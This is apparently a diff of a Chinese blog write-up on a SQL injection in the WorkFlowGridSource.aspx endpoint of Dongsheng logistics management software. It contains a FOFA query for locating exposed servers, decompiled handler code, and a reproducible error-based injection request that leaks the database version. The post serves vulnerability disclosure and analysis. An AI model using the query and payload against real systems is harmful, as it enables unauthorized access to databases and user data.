@@ -8,29 +8,15 @@ asset_dir: embedded-base64
 
 东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WorkFlowGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL注入)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
 
-物流软件安全
-
 # 影响版本
 
 # fofa语法
 
 > body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
->
-> SQL注入检测工具
 
 # 漏洞分析
 
-深入探索
-
-JSON处理工具
-
-在线安全工具
-
-Windows安全工具
-
 根据 `WorkFlowGridSource.aspx` 的代码引用 `DSWeb.WorkFlow.WorkFlowGridSource` ，在dll中找到它的逻辑实现
-
-代码安全审计
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -46,9 +32,17 @@ protected void Page_Load(object sender, EventArgs e)
       this.Response.Write(this.GetWorkFlowSteps(this.strWorkFlowID));
 ```
 
+深入探索
+
+鉴权
+
+企业安全咨询
+
+云安全解决方案
+
 主要就是根据`handle`参数的值来进行处理不同的分支逻辑
 
-漏洞扫描服务
+物流软件安全
 
 当**`handle=steplist`**且`flowid`必须存在时，进入`GetWorkFlowSteps`方法
 
@@ -63,14 +57,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-技术文章订阅
-
-Web安全书籍
-
-安全运维咨询
-
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
 Host: dongsheng.mrxn.net
@@ -80,4 +66,4 @@ Host: dongsheng.mrxn.net
 
 通过报错注入在响应里回显数据库版本信息。
 
-计算机安全
+SQL注入防护
